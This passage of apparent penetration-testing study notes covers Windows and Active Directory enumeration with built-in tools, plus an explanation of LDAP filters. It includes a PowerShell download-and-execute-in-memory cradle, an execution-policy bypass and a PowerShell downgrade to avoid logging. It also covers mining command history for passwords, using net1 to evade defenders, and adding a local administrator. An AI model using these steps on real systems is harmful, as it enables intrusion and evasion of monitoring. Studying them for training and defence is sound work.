| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain Controller the host checks in with (ran from CMD-prompt) |

You can use `systeminfo` command with the above commands to obtain a initial picture of the state in the host. Running one command will generate fewer logs, meaning less of chance we are noticed on the host.

We can use built-in function in powershell to obtain more information

### PowerShell Enumeration & Execution Commands

| Cmdlet / Command | Description |
| :--- | :--- |
| `Get-Module` | Lists available modules loaded for use. |
| `Get-ExecutionPolicy -List` | Will print the execution policy settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process` | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value` | Return environment values such as key paths, users, computer information, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

#### Downgrade PowerShell

Many defenders are unware that several version of PowerShell often exist in a host. if not uninstalled, they can still be used. PowerShell event logging was introduced as a feature in 3.0 and forward.

We can attempt to call PowerShell 2.0 or older, and script block logging and commands will not be logged in the event viewer.

Check the version with:
```powershell
Get-host
```

Downgrade:
```powershell
powershell.exe -version 2
```

You can check the version again:
```powershell
Get-host
```

You have to be aware that the command `powershell.exe -version 2` within the PowerShell will be logged.

### Checking defenses

We can use netsh and sc to get a feel for the state of the host when it comes to Windows Firewall and to check the status of Windows Defender

#### Firewall checks

```powershell
netsh advfirewall show allprofiles
```

#### Windows Defender Check

Check if it is running
```
sc query windefend
```

Check the status and configuration settings

```
Get-MpComputerStatus
```

### Check if you are alone

When you land in a host for the first time, it is important to check if there are someone more connected. If you start doing things, there is the potential for them to notice you.

For this you can use
```powershell
qwinsta
```

### Network Settings

### Network & Firewall Enumeration Commands

| Command                              | Description                                                                                                      |
| :----------------------------------- | :--------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts stored in the ARP table.                                                                   |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

### Windows Management Instrumentation (WMI)

Is a script engine widely used within Windows enterprise environment to retrieve information and run administrative tasks.

### WMIC Enumeration Commands

| Command | Description |
| :--- | :--- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of the Hotfixes applied |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list |
| `wmic process list /format:list` | A listing of all processes on host |
| `wmic ntdomain list /format:list` | Displays information about the Domain and Domain Controllers |
| `wmic useraccount list /format:list` | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list` | Information about all local groups |
| `wmic sysaccount list /format:list` | Dumps information about any system accounts that are being used as service accounts |

Obtain information about the domain, child domain and the external forest that our current domain has a trust with.

```powershell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

Useful cheatsheet for wmic: https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

### Net Commands

We can use net commands to enumerate information from the domain such as:

Keep in mind that `net.exe` commands are typically monitored by EDR solutions. Some organizations will even configure their monitoring tool to throws alerts if certain commands are run by users in specific OUs, such as a Marketing associate's account running commands such as `whoami` or `net localgroup administrators`. This is a potential red flags.

- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

### Net Commands Enumeration & Management

Remember that you can use `net1`.

| Command                                         | Description                                                                                                                |
| :---------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                    |
| `net accounts /domain`                          | Password and lockout policy                                                                                                |
| `net group /domain`                             | Information about domain groups                                                                                            |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                    |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                        |
| `net group "Domain Controllers" /domain`        | List PC accounts of domain controllers                                                                                     |
| `net group <domain_group_name> /domain`         | Users that belong to the specified group                                                                                   |
| `net groups /domain`                            | List of domain groups                                                                                                      |
| `net localgroup`                                | All available local groups                                                                                                 |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
| `net localgroup Administrators`                 | Information about a local group (admins)                                                                                   |
| `net localgroup administrators [username] /add` | Add user to local administrators group                                                                                     |
| `net share`                                     | Check current shares                                                                                                       |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                             |
| `net user /domain`                              | List all users of the domain                                                                                               |
| `net user %username%`                           | Information about the current user                                                                                         |
| `net use x: \\computer\share`                   | Mount the share locally                                                                                                    |
| `net view`                                      | Get a list of computers                                                                                                    |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                      |
| `net view \\computer /ALL`                      | List shares of a computer                                                                                                  |
| `net view /domain`                              | List of PCs of the domain                                                                                                  |

Listing domain groups

```
net group /domain
```

Obtain information about a domain user

```
net user /domain wrouse
```

#### Net commands tricks to avoid network defenders

If you believe that network defender are actively looking you can use **net1** instead of `net` command. This will be execute the same functions

### Dsquery

This command-line tool is used to find Active Directory objects.
The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView.

It is possible that we don't have this tool, only hosts with Active Directory Domain Services Role (normally DC) have it.

To use it we need to elevated privileges to run a instance of powershell or cmd with `SYSTEM`.

#### User Search

```powershell
dsquery user
```

#### Computer Search

```powershell
dsquery computer
```

#### Wildcard Search

We can use wildcard search to view all objects in an OU, for example:

```powershell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

#### Users With Specific Attributes Set (PASSWD_NOTREQD)

We can combine `dsquery` with LDAP search filters. For example, looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

#### Searching for domain controller

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

### LDAP Filtering Explained

`userAccountControl:1.2.840.113556.1.4.803:=8192` This string looking at the User Account Control (UAC) attributes.

`=8192` Represents the decimal bitmask we want to match in this search. This decimal number correspond to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set

```
User Account Control Bit Values

                                    1   2   32  64  128 512 2048 4096 8192 65536 524288 1048576
                                    |   |   |   |   |   |   |    |    |    |     |      |
  Login Script Will Execute --------+   |   |   |   |   |   |    |    |    |     |      |
        Account Is Disabled ------------+   |   |   |   |   |    |    |    |     |      |
      Password Not Required ----------------+   |   |   |   |    |    |    |     |      |
      Password Can't Change --------------------+   |   |   |    |    |    |     |      |
             Encrypted Text ------------------------+   |   |    |    |    |     |      |
           Password Allowed                             |   |    |    |    |     |      |
        Normal User Account ----------------------------+   |    |    |    |     |      |
  Interdomain Trust Account --------------------------------+    |    |    |     |      |
         Domain Workstation -------------------------------------+    |    |     |      |
           or Member Server                                           |    |     |      |
          Domain Controller ------------------------------------------+    |     |      |
    Password Does Not Expire ----------------------------------------------+     |      |
   Trusted For Impersonation ----------------------------------------------------+      |
             Account May Not -----------------------------------------------------------+
             Be Impersonated
```

#### OID match string

For LDAP and AD there are three main matching rules.

We are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

1. `1.2.840.113556.1.4.803`

We want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

2. `1.2.840.113556.1.4.804`

To match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries. For example if a user belongs to a group and that group belongs to another group (nested groups)...

3. `1.2.840.113556.1.4.1941`

#### Logical Operators

When building out search strings, we can utilize logical operators for combine values. The operators `&`, `|` and `!` are used for this purpose.

The first criteria indicate thta the object must be a user and combines it with searching for UAC bit value of 64 (Password can't change)

`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

You can use multiples attributes like `(&(1) (2) (3))`

Search for any user object that does not have the password can't change attribute set.

`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`
